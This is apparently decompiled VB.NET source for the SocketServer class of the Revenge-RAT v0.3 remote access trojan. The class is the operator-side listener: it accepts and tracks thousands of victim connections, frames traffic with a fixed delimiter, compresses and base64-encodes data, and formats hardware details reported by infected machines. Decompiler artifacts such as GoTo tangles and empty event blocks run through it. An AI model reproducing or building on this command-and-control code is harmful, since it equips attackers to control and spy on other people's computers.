Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports RevengeRAT.My
Imports System
Imports System.Collections.Generic
Imports System.Diagnostics
Imports System.IO
Imports System.IO.Compression
Imports System.Net.Sockets
Imports System.Runtime.CompilerServices
Imports System.Security.Cryptography
Imports System.Text
Imports System.Threading
Imports System.Windows.Forms

Namespace RevengeRAT
    Public Class SocketServer
        Inherits ProgressBar
        Private DataEvent As SocketServer.DataEventHandler
        Private DisConnectedEvent As SocketServer.DisConnectedEventHandler
        Private ConnectedEvent As SocketServer.ConnectedEventHandler

        Public Custom Event Connected As ConnectedEventHandler
            AddHandler(value As ConnectedEventHandler)
                Me.ConnectedEvent = CType([Delegate].Combine(Me.ConnectedEvent, value), SocketServer.ConnectedEventHandler)
            End AddHandler
            RemoveHandler(value As ConnectedEventHandler)
                Me.ConnectedEvent = CType([Delegate].Remove(Me.ConnectedEvent, value), SocketServer.ConnectedEventHandler)
            End RemoveHandler
            RaiseEvent(sock As Integer)

            End RaiseEvent
        End Event
        Public Custom Event Data As DataEventHandler
            AddHandler(value As DataEventHandler)
                Me.DataEvent = CType([Delegate].Combine(Me.DataEvent, value), SocketServer.DataEventHandler)
            End AddHandler
            RemoveHandler(value As DataEventHandler)
                Me.DataEvent = CType([Delegate].Remove(Me.DataEvent, value), SocketServer.DataEventHandler)
            End RemoveHandler
            RaiseEvent(sock As Integer, B As Byte())

            End RaiseEvent
        End Event
        Public Custom Event DisConnected As DisConnectedEventHandler
            AddHandler(value As DisConnectedEventHandler)
                Me.DisConnectedEvent = CType([Delegate].Combine(Me.DisConnectedEvent, value), SocketServer.DisConnectedEventHandler)
            End AddHandler
            RemoveHandler(value As DisConnectedEventHandler)
                Me.DisConnectedEvent = CType([Delegate].Remove(Me.DisConnectedEvent, value), SocketServer.DisConnectedEventHandler)
            End RemoveHandler
            RaiseEvent(sock As Integer)

            End RaiseEvent
        End Event
        Public Sub New()
            Me.T = New Thread(New ThreadStart(AddressOf Me.PND), 10)
            Me.SKT = -1
            Me.SK = New Socket(&H2710 - 1) {}
            Me.SPL = "*-]NK[-*"
            Me.Online = New List(Of Integer)
            Me.oIP = New String(&H2710 - 1) {}
        End Sub
        Private Sub Lam__3(ByVal a0 As Object)
            Me.RC(Conversions.ToInteger(a0))
        End Sub

        Public Shared Function Compress(ByVal data As Byte()) As Byte()
            Dim stream2 As New MemoryStream
            Dim stream As New GZipStream(stream2, CompressionMode.Compress, True)
            stream.Write(data, 0, data.Length)
            stream.Close()
            Return stream2.ToArray
        End Function

        Public Shared Function CPS(ByVal Input As Integer) As String
            If (Input <> 0) Then
                If (Input = 1) Then
                    Return "CPU Enabled"
                End If
                If (Input = 2) Then
                    Return "CPU Disabled by User via BIOS Setup"
                End If
                If (Input = 3) Then
                    Return "CPU Disabled By BIOS (POST Error)"
                End If
                If (Input = 4) Then
                    Return "CPU is Idle"
                End If
                If (Input = 5) Then
                    Return "Reserved"
                End If
                If (Input = 6) Then
                    Return "Reserved"
                End If
                If (Input = 7) Then
                    Return "Other"
                End If
            End If
            Return "Unknown"
        End Function

        Public Shared Function CTMGORHR(ByVal Input As Integer) As Object
            Dim num As Integer = Input
            If (num >= &H400) Then
                Return (Strings.FormatNumber((CDbl(Input) / 1024), 1, TriState.UseDefault, TriState.UseDefault, TriState.UseDefault) & " GHz")
            End If
            If ((num >= 0) AndAlso (num <= &H3FF)) Then
                Return (Strings.FormatNumber(Input, 1, TriState.UseDefault, TriState.UseDefault, TriState.UseDefault) & " MHz")
            End If
            Return "????"
        End Function

        Public Shared Function Decode(ByVal Input As String) As Object
            Return Encoding.UTF8.GetString(Convert.FromBase64String(Input))
        End Function

        Public Shared Function Decompress(ByVal data As Byte()) As Byte()
            Dim stream2 As New MemoryStream
            stream2.Write(data, 0, data.Length)
            stream2.Position = 0
            Dim stream As New GZipStream(stream2, CompressionMode.Decompress, True)
            Dim stream3 As New MemoryStream
            Dim array As Byte() = New Byte(&H40 - 1) {}
            Dim count As Integer = -1
            count = stream.Read(array, 0, array.Length)
            Do While (count > 0)
                stream3.Write(array, 0, count)
                count = stream.Read(array, 0, array.Length)
            Loop
            stream.Close()
            Return stream3.ToArray
        End Function

        Public Sub Disconnect(ByVal Sock As Integer)
            Try
                Me.SK(Sock).Disconnect(False)
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Dim exception As Exception = exception1
                ProjectData.ClearProjectError()
            End Try
            Try
                Me.SK(Sock).Close()
            Catch exception3 As Exception
                ProjectData.SetProjectError(exception3)
                Dim exception2 As Exception = exception3
                ProjectData.ClearProjectError()
            End Try
            Me.SK(Sock) = Nothing
        End Sub

        Public Shared Function Encode(ByVal Input As String) As Object
            Return Convert.ToBase64String(Encoding.UTF8.GetBytes(Input))
        End Function

        Public Shared Function GCL(ByVal Input As Integer) As String
            If (Input = 0) Then
                Return "Internal"
            End If
            If (Input = 1) Then
                Return "External"
            End If
            If (Input = 2) Then
                Return "Reserved"
            End If
            If (Input = 3) Then
                Return "Unknown"
            End If
            Return "Unknown"
        End Function

        Public Shared Function GCS(ByVal Input As Integer) As String
            Dim str As String
            If (Input = 1) Then
                Return "Other"
            End If
            If (Input = 2) Then
                Return "Unknown"
            End If
            If (Input = 3) Then
                Return "Instruction"
            End If
            If (Input = 4) Then
                Return "Data"
            End If
            If (Input = 5) Then
                str = "Unified"
            End If
            Return str
        End Function

        Public Shared Function GCT(ByVal Input As Integer) As String
            If (Input <> 0) Then
                If (Input = 1) Then
                    Return "Readable"
                End If
                If (Input = 2) Then
                    Return "Writeable"
                End If
                If (Input = 3) Then
                    Return "Read/Write"
                End If
                If (Input = 4) Then
                    Return "Write Once"
                End If
            End If
            Return "Unknown"
        End Function

        Public Shared Function GenRandom(ByVal minamount As Integer, ByVal maxamount As Integer) As String
            Dim str2 As String
            Dim num5 As Integer
            Try
                Dim num6 As Integer
Label_0001:
                ProjectData.ClearProjectError()
                Dim num4 As Integer = -2
Label_000A:
                num6 = 2
                Dim random As New Random
Label_0013:
                num6 = 3
                Dim str4 As String = Nothing
Label_0019:
                num6 = 4
                Dim str As String = "1234567890"
Label_0022:
                num6 = 5
                Dim num3 As Integer = random.Next((minamount + 1), maxamount)
                Dim num2 As Integer = 1
                GoTo Label_0080
Label_0036:
                num6 = 6
                Dim num As Integer = CInt(Math.Round(CDbl((Conversion.Int(CSng(((str.Length - 2) * VBMath.Rnd))) + 1.0!))))
Label_005D:
                num6 = 7
                str4 = (str4 & Conversions.ToString(str.Chars(num)))
Label_0076:
                num6 = 8
                num2 += 1
Label_0080:
                If (num2 <= num3) Then
                    GoTo Label_0036
                End If
Label_008A:
                num6 = 9
                Dim str3 As String = "0987654321"
Label_0094:
                num6 = 10
                str2 = (Conversions.ToString(str3.Chars(random.Next(0, (str3.Length - 1)))) & str4)
                GoTo Label_0151
Label_00CC:
                num5 = 0
                Select Case (num5 + 1)
                    Case 1
                        GoTo Label_0001
                    Case 2
                        GoTo Label_000A
                    Case 3
                        GoTo Label_0013
                    Case 4
                        GoTo Label_0019
                    Case 5
                        GoTo Label_0022
                    Case 6
                        GoTo Label_0036
                    Case 7
                        GoTo Label_005D
                    Case 8
                        GoTo Label_0076
                    Case 9
                        GoTo Label_008A
                    Case 10
                        GoTo Label_0094
                    Case 11
                        GoTo Label_0151
                    Case Else
                        GoTo Label_0146
                End Select
Label_0106:
                num5 = num6
                Select Case If((num4 > -2), num4, 1)
                    Case 0
                        GoTo Label_0146
                    Case 1
                        GoTo Label_00CC
                End Select
            Catch obj1 As Exception
                ProjectData.SetProjectError(DirectCast(obj1, Exception))
                GoTo Label_0106
            End Try
Label_0146:
            Throw ProjectData.CreateProjectError(-2146828237)
Label_0151:
            If (num5 <> 0) Then
                ProjectData.ClearProjectError()
            End If
            Return str2
        End Function

        Public Shared Function GETF(ByVal Input As Integer) As String
            If (Input <> 0) Then
                If (Input = 1) Then
                    Return "Other"
                End If
                If (Input = 2) Then
                    Return "SIP"
                End If
                If (Input = 3) Then
                    Return "DIP"
                End If
                If (Input = 4) Then
                    Return "ZIP"
                End If
                If (Input = 5) Then
                    Return "SOJ"
                End If
                If (Input = 6) Then
                    Return "Proprietary"
                End If
                If (Input = 7) Then
                    Return "SIMM"
                End If
                If (Input = 8) Then
                    Return "DIMM"
                End If
                If (Input = 9) Then
                    Return "TSOP"
                End If
                If (Input = 10) Then
                    Return "PGA"
                End If
                If (Input = 11) Then
                    Return "RIMM"
                End If
                If (Input = 12) Then
                    Return "SODIMM"
                End If
                If (Input = 13) Then
                    Return "SRIMM"
                End If
                If (Input = 14) Then
                    Return "SMD"
                End If
                If (Input = 15) Then
                    Return "SSMP"
                End If
                If (Input = &H10) Then
                    Return "QFP"
                End If
                If (Input = &H11) Then
                    Return "TQFP"
                End If
                If (Input = &H12) Then
                    Return "SOIC"
                End If
                If (Input = &H13) Then
                    Return "LCC"
                End If
                If (Input = 20) Then
                    Return "PLCC"
                End If
                If (Input = &H15) Then
                    Return "BGA"
                End If
                If (Input = &H16) Then
                    Return "FPBGA"
                End If
                If (Input = &H17) Then
                    Return "LGA"
                End If
            End If
            Return "Unknown"
        End Function

        Public Shared Function GetIndex(ByVal N As Integer) As Object
            Dim obj2 As Object
            If (N = 0) Then
                Return 10
            End If
            If (N = 1) Then
                Return 20
            End If
            If (N = 2) Then
                Return 30
            End If
            If (N = 3) Then
                Return 40
            End If
            If (N = 4) Then
                Return 50
            End If
            If (N = 5) Then
                Return 60
            End If
            If (N = 6) Then
                Return 70
            End If
            If (N = 7) Then
                Return 80
            End If
            If (N = 8) Then
                Return 90
            End If
            If (N = 9) Then
                obj2 = 100
            End If
            Return obj2
        End Function

        Public Shared Function GetSize(ByVal C As UInt64) As String
            Dim str As String
            Try
                Dim num As UInt64 = C
                If (num >= &H10000000000) Then
                    SocketServer.Bytes = (CDbl(C) / 1099511627776)
                    Return (Strings.FormatNumber(SocketServer.Bytes, 2, TriState.UseDefault, TriState.UseDefault, TriState.UseDefault) & " TB")
                End If
                If ((num >= &H40000000) AndAlso (num <= &HFFFFFFFFFF)) Then
                    SocketServer.Bytes = (CDbl(C) / 1073741824)
                    Return (Strings.FormatNumber(SocketServer.Bytes, 2, TriState.UseDefault, TriState.UseDefault, TriState.UseDefault) & " GB")
                End If
                If ((num >= &H100000) AndAlso (num <= &H3FFFFFFF)) Then
                    SocketServer.Bytes = (CDbl(C) / 1048576)
                    Return (Strings.FormatNumber(SocketServer.Bytes, 2, TriState.UseDefault, TriState.UseDefault, TriState.UseDefault) & " MB")
                End If
                If ((num >= &H400) AndAlso (num <= &HFFFFF)) Then
                    SocketServer.Bytes = (CDbl(C) / 1024)
                    Return (Strings.FormatNumber(SocketServer.Bytes, 2, TriState.UseDefault, TriState.UseDefault, TriState.UseDefault) & " KB")
                End If
                If ((num >= 0) AndAlso (num <= &H3FF)) Then
                    SocketServer.Bytes = C
                    Return (Strings.FormatNumber(SocketServer.Bytes, 2, TriState.UseDefault, TriState.UseDefault, TriState.UseDefault) & " bytes")
                End If
                Return ""
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                str = ""
                ProjectData.ClearProjectError()
                Return str
                ProjectData.ClearProjectError()
            End Try
            Return str
        End Function

        Public Shared Function GRAMType(ByVal Input As Integer) As String
            If (Input = 0) Then
                Return "Unknown"
            End If
            If (Input = 1) Then
                Return "Other"
            End If
            If (Input = 2) Then
                Return "DRAM"
            End If
            If (Input = 3) Then
                Return "Synchronous DRAM"
            End If
            If (Input = 4) Then
                Return "Cache DRAM"
            End If
            If (Input = 5) Then
                Return "EDO"
            End If
            If (Input = 6) Then
                Return "EDRAM"
            End If
            If (Input = 7) Then
                Return "VRAM"
            End If
            If (Input = 8) Then
                Return "SRAM"
            End If
            If (Input = 9) Then
                Return "RAM"
            End If
            If (Input = 11) Then
                Return "Flash"
            End If
            If (Input = 12) Then
                Return "EEPROM"
            End If
            If (Input = 14) Then
                Return "EPROM"
            End If
            If (Input = 15) Then
                Return "CDRAM"
            End If
            If (Input = &H10) Then
                Return "3DRAM"
            End If
            If (Input = &H11) Then
                Return "SDRAM"
            End If
            If (Input = &H12) Then
                Return "SGRAM"
            End If
            If (Input = &H13) Then
                Return "RDRAM"
            End If
            If (Input = 20) Then
                Return "DDR"
            End If
            If (Input = &H15) Then
                Return "DDR2"
            End If
            If (Input = &H16) Then
                Return "DDR2 FB-DIMM"
            End If
            If (Input = &H18) Then
                Return "DDR3"
            End If
            If (Input = &H19) Then
                Return "FBD2"
            End If
            Return "????"
        End Function

        Public Shared Function GridLines(ByVal Stats As Boolean) As Object
            Dim obj2 As Object
            Dim num2 As Integer
            Try
                Dim num3 As Integer
Label_0001:
                ProjectData.ClearProjectError()
                Dim num As Integer = -2
Label_0009:
                num3 = 2
                My.Forms.Main.Listview1.GridLines = Stats
Label_0021:
                num3 = 3
                My.Forms.Main.Logs.GridLines = Stats
Label_0039:
                num3 = 4
                My.Forms.Main.BlockedIp.GridLines = Stats
                GoTo Label_00BF
Label_0059:
                num2 = 0
                Select Case (num2 + 1)
                    Case 1
                        GoTo Label_0001
                    Case 2
                        GoTo Label_0009
                    Case 3
                        GoTo Label_0021
                    Case 4
                        GoTo Label_0039
                    Case 5
                        GoTo Label_00BF
                    Case Else
                        GoTo Label_00B4
                End Select
Label_007A:
                num2 = num3
                Select Case If((num > -2), num, 1)
                    Case 0
                        GoTo Label_00B4
                    Case 1
                        GoTo Label_0059
                End Select
            Catch obj1 As Exception
                ProjectData.SetProjectError(DirectCast(obj1, Exception))
                GoTo Label_007A
            End Try
Label_00B4:
            Throw ProjectData.CreateProjectError(-2146828237)
Label_00BF:
            If (num2 <> 0) Then
                ProjectData.ClearProjectError()
            End If
            Return obj2
        End Function

        Public Shared Function GWS(ByVal Input As Integer) As Integer
            Dim num As Integer
            Dim num2 As Integer = Input
            If ((num2 >= 0) AndAlso (num2 <= 10)) Then
                Return 2
            End If
            If ((num2 >= 10) AndAlso (num2 <= 30)) Then
                Return 3
            End If
            If ((num2 >= 30) AndAlso (num2 <= 50)) Then
                Return 4
            End If
            If ((num2 >= 50) AndAlso (num2 <= 80)) Then
                Return 5
            End If
            If ((num2 >= 80) AndAlso (num2 <= 100)) Then
                num = 6
            End If
            Return num
        End Function

        Public Function IP(ByRef sock As Integer) As String
            Dim str As String
            Try
                Me.oIP(sock) = Strings.Split(Me.SK(sock).RemoteEndPoint.ToString, ":", -1, CompareMethod.Binary)(0)
                str = Me.oIP(sock)
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Dim exception As Exception = exception1
                If (Me.oIP(sock) Is Nothing) Then
                    str = "X.X.X.X"
                    ProjectData.ClearProjectError()
                    Return str
                End If
                str = Me.oIP(sock)
                ProjectData.ClearProjectError()
                Return str
                ProjectData.ClearProjectError()
            End Try
            Return str
        End Function

        Public Shared Function md5(ByVal B As Byte()) As String
            B = New MD5CryptoServiceProvider().ComputeHash(B)
            Dim str2 As String = ""
            Dim buffer As Byte() = B
            Dim num3 As Integer = (buffer.Length - 1)
            Dim i As Integer = 0
            Do While (i <= num3)
                str2 = (str2 & buffer(i).ToString("x2"))
                i += 1
            Loop
            Return str2
        End Function

        Private Function NEWSKT() As Integer
            Do While True
                Thread.Sleep(1)
                Me.SKT += 1
                If (Me.SKT = Me.SK.Length) Then
                    Me.SKT = 0
                ElseIf Not Me.Online.Contains(Me.SKT) Then
                    Me.Online.Add(Me.SKT)
                    Return Conversions.ToInteger(Me.SKT.ToString.Clone)
                End If
            Loop
        End Function

        Private Sub PND()
            Me.SK = New Socket(&H2710 - 1) {}
            Do While True
                Thread.Sleep(1)
                If Me.S.Pending Then
                    Dim index As Integer = Me.NEWSKT
                    Me.SK(index) = Me.S.AcceptSocket
                    Me.SK(index).ReceiveBufferSize = &H100000
                    Me.SK(index).SendBufferSize = &H100000
                    Me.SK(index).ReceiveTimeout = -1
                    Me.SK(index).SendTimeout = -1
                    Dim dz As New Thread(New ParameterizedThreadStart(AddressOf Me.Lam__3), 10)
                    dz.Start(index)
                    Dim connectedEvent As ConnectedEventHandler = Me.ConnectedEvent
                    If (Not connectedEvent Is Nothing) Then
                        connectedEvent.Invoke(index)
                    End If
                End If
            Loop
        End Sub

        Public Shared Function RAM(ByVal N As String) As Object
            Dim str As String = ""
            Dim num As Long = CLng(Math.Round(Conversion.Val(N)))
            If (num > &H40000000) Then
                Dim num2 As Double = (CDbl(num) / 1073741824)
                str = num2.ToString
                Return (str.Remove(4, (str.Length - 4)) & " GB")
            End If
            If (num > &H100000) Then
                str = (CDbl(num) / 1048576).ToString
                str = (str.Remove(4, (str.Length - 4)) & " MB")
            End If
            Return str
        End Function

        Public Sub RC(ByVal sock As Integer)
            Dim stream As New MemoryStream
            Dim num As Integer = 0
Label_000A:
            num += 1
            If (num = 500) Then
                Try
                    If (Me.SK(sock).Poll(-1, SelectMode.SelectRead) And (Me.SK(sock).Available <= 0)) Then
                        GoTo Label_0223
                    End If
                Catch exception1 As Exception
                    ProjectData.SetProjectError(exception1)
                    Dim exception As Exception = exception1
                    ProjectData.ClearProjectError()
                    GoTo Label_0223
                End Try
                num = 0
            End If
            Try
                If ((Me.SK(sock) Is Nothing) OrElse Not Me.SK(sock).Connected) Then
                    GoTo Label_0223
                End If
                If (Me.SK(sock).Available <= 0) Then
                    GoTo Label_0215
                End If
                Dim buffer As Byte() = New Byte(((Me.SK(sock).Available - 1) + 1) - 1) {}
                Me.SK(sock).Receive(buffer, 0, buffer.Length, SocketFlags.None)
                stream.Write(buffer, 0, buffer.Length)
Label_00ED:
                If Functions.BS(stream.ToArray).Contains(Me.SPL) Then
                    Dim instance As Array = Functions.fx(stream.ToArray, Me.SPL)
                    Dim dataEvent As DataEventHandler = Me.DataEvent
                    If (Not dataEvent Is Nothing) Then
                        dataEvent.Invoke(sock, DirectCast(NewLateBinding.LateIndexGet(instance, New Object() {0}, Nothing), Byte()))
                    End If
                    stream.Dispose()
                    stream = New MemoryStream
                    If (instance.Length = 2) Then
                        stream.Write(DirectCast(NewLateBinding.LateIndexGet(instance, New Object() {1}, Nothing), Byte()), 0, Conversions.ToInteger(NewLateBinding.LateGet(NewLateBinding.LateIndexGet(instance, New Object() {1}, Nothing), Nothing, "length", New Object(0 - 1) {}, Nothing, Nothing, Nothing)))
                        Thread.Sleep(1)
                        GoTo Label_00ED
                    End If
                End If
            Catch exception4 As Exception
                ProjectData.SetProjectError(exception4)
                Dim exception2 As Exception = exception4
                ProjectData.ClearProjectError()
                GoTo Label_0223
                ProjectData.ClearProjectError()
            End Try
Label_0215:
            Thread.Sleep(1)
            GoTo Label_000A
Label_0223:
            Me.Disconnect(sock)
            Try
                Me.Online.Remove(sock)
            Catch exception5 As Exception
                ProjectData.SetProjectError(exception5)
                Dim exception3 As Exception = exception5
                ProjectData.ClearProjectError()
            End Try
            Dim disConnectedEvent As DisConnectedEventHandler = Me.DisConnectedEvent
            If (Not disConnectedEvent Is Nothing) Then
                disConnectedEvent.Invoke(sock)
            End If
        End Sub

        Public Sub Send(ByVal sock As Integer, ByVal s As String)
            Me.Send(sock, Functions.SB(s))
        End Sub

        Public Sub Send(ByVal sock As Integer, ByVal b As Byte())
            Try
                Dim stream As New MemoryStream
                stream.Write(b, 0, b.Length)
                stream.Write(Functions.SB(Me.SPL), 0, Me.SPL.Length)
                Me.SK(sock).Send(stream.ToArray, 0, CInt(stream.Length), SocketFlags.None)
                stream.Dispose()
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Dim exception As Exception = exception1
                Me.Disconnect(sock)
                ProjectData.ClearProjectError()
            End Try
        End Sub

        Public Sub Start(ByVal P As Integer)
            Me.S = New TcpListener(P)
            Me.S.Start()
            Me.T.Start()
        End Sub

        Public Sub StopL()
            Try
                Me.S.Stop()
                Me.T.Abort()
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Dim exception As Exception = exception1
                MessageBox.Show(exception.Message.ToString, "Revenge-RAT v0.3", MessageBoxButtons.OK, MessageBoxIcon.Hand)
                ProjectData.ClearProjectError()
            End Try
        End Sub

        Protected Overrides ReadOnly Property CreateParams As CreateParams
            Get
                Dim createParamsy As CreateParams = MyBase.CreateParams
                createParamsy.Style = (createParamsy.Style Or 6)
                Return createParamsy
            End Get
        End Property


        Public Shared Bytes As Double
        Private oIP As String()
        Public Online As List(Of Integer)
        Private S As TcpListener
        Public SK As Socket()
        Private SKT As Integer
        Private SPL As String
        Private T As Thread

        Public Delegate Sub ConnectedEventHandler(ByVal sock As Integer)
        Public Delegate Sub DataEventHandler(ByVal sock As Integer, ByVal B As Byte())
        Public Delegate Sub DisConnectedEventHandler(ByVal sock As Integer)
    End Class
End Namespace


